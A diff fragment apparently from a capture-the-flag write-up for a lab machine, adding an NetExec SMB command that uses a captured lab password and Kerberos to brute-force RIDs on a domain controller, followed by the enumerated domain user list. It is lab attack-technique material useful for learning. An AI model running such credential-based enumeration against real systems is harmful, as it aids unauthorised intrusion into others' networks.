@@ -358,6 +358,28 @@ SMB         dc.absolute.htb 445    DC               SYSVOL          READ        
 Read access on default shares
 
 ```python
-
+faketime -f +7h nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+J.Roberts
+M.Chaffrey
+D.Klay
+s.osvald
+j.robinson
+n.smith
+m.lovegod
+l.moore
+c.colt
+s.johnson
+d.lemm
+svc_smb
+svc_audit
+winrm_user
 ```
+
+Now using my credentials, i can dump the full user list
+
+
 
